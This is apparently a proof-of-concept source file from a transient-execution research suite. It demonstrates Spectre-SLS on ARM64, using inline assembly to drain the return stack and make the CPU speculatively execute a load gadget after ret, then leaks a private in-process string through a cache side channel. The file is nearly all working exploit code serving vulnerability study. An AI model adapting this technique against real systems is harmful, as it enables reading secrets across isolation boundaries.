/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

// Spectre-SLS: Straight-Line Speculation past ret on ARM64.
//
// When the Return Address Stack (RAS) is empty, ret (BR X30) falls back
// to BTB prediction. If the BTB also misses, the CPU predicts the
// fallthrough address, speculatively executing dead code after ret.
//
// PHT/BTB considerations:
// - The drain loop's ret instructions train the BTB for their own PC,
//   but the SLS trigger ret is at a different PC, so the drain training
//   does not carry over.
// - A fixed SLS ret PC would be learned by the BTB after the first call,
//   causing subsequent calls to predict the correct architectural target
//   instead of fallthrough. To defeat this, we use variant-indexed ret
//   instructions: 32 ret instructions at unique PCs, selected by the run
//   counter. Each variant's ret is a BTB miss on first use, ensuring
//   fallthrough prediction and SLS trigger on every call within the
//   variant window.

#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "compiler_specifics.h"
#include "local_content.h"

constexpr int kRasDrainCount = 32;
constexpr int kVariantCount = 32;

// x0 = data, x1 = offset, x2 = oracle, x7 = variant index (0..31)
SAFESIDE_NEVER_INLINE
static void TriggerSls(const char *data, size_t offset,
                       const void *oracle, size_t variant) {
  register const char *r0 asm("x0") = data;
  register size_t r1 asm("x1") = offset;
  register const void *r2 asm("x2") = oracle;
  register size_t r7 asm("x7") = variant;

  asm volatile(
      // Phase 1: RAS drain
      // Each iteration: set X30 to local label, ret pops stale RAS
      // entry, mispredicts, flushes pipeline, resumes at local label.
      // After 32 iterations the RAS is empty.
      "mov x4, #32\n"
      "adr x5, 1f\n"
      "0:\n"
      "  mov x30, x5\n"
      "  ret\n"
      "1:\n"
      "  subs x4, x4, #1\n"
      "  b.ne 0b\n"

      // Phase 2: variant-indexed SLS trigger
      // Jump to variant[run % 32]. Each variant has ret at a unique PC
      // that the BTB has never seen, so it predicts fallthrough.
      "adr x8, 2f\n"
      "add x8, x8, x7, lsl #5\n"  // variant * 32 bytes per variant
      "br x8\n"

      // 32 variants, each exactly 32 bytes (8 instructions).
      // ret underflows RAS, BTB misses -> fallthrough into dead code.
      "2:\n"
      ".rept 32\n"
      "  adr x30, 3f\n"
      "  ret\n"
      "  ldrb w3, [x0, x1]\n"
      "  lsl x3, x3, #12\n"
      "  add x3, x3, x2\n"
      "  ldrb w3, [x3]\n"
      "  ret\n"
      "  nop\n"
      ".endr\n"

      "3:\n"
      :
      : "r"(r0), "r"(r1), "r"(r2), "r"(r7)
      : "x3", "x4", "x5", "x8", "x30", "memory", "cc"
  );
}

static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();
    size_t safe_offset = run % strlen(public_data);
    TriggerSls(public_data, offset, oracle.data(), run % kVariantCount);

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
